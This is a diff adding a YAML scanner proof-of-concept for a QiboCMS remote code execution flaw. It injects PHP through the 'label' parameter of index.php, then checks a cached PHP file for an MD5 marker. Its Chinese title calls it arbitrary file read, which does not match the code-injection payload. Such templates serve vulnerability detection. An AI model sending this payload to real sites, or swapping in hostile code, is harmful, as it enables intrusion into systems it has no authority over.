@@ -1,0 +1,23 @@
+id: poc-yaml-qibocms-rce
+info:
+  name: QiboCMS 任意文件读取漏洞
+  severity: high
+  tags:
+  - rce
+  finger: QiboCMS
+  osprey-id: vb_2019_0009
+requests:
+- method: GET
+  path: /index.php?label[a'."${@var_dump(md5(0x1111))}".'][asd]=aaaa
+  headers: {}
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /cache/label_cache/index_1_0_0_0_0_46449.php
+  headers: {}
+  expression: 'contains(body, "665d5cbb82b5785d9f344c46417c6c36")
+
+    '
+variables: {}
+transport: http
